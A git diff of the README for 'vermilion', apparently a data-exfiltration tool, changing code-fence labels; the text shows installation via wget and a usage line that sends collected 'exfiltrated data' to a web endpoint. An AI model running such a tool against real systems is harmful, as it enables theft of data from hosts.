@@ -6,7 +6,7 @@
 New version of the tool are released via Github.  
 You can retrieve the release you want from [*this*](https://github.com/R3DRUN3/vermilion/releases/) page.  
 Example via bash (wget):  
-```sh
+```console
 wget https://github.com/R3DRUN3/vermilion/releases/download/v0.1.0/vermilion_0.1.0_linux_amd64.tar.gz
 tar -xzf vermilion_0.1.0_linux_amd64.tar.gz
 chmod +x vermilion
@@ -14,16 +14,16 @@ chmod +x vermilion
 
 ## Usage
 In order to see the tool helper run:  
-```sh
+```console
 ./vermilion -h
 ```  
 
 By default no exfiltration is executed, the following two commands are the same:
-```sh
+```console
 ./vermilion
 ```
 and
-```sh
+```console
 vermilion --noexf
 ```  
 
@@ -32,7 +32,7 @@ The archive contains all exfiltrated data.
 
 
 If you want to specify and endpoint for exfiltration run:  
-```sh
+```console
 vermilion -e https://<your-web-endpoint>
 ```  
 
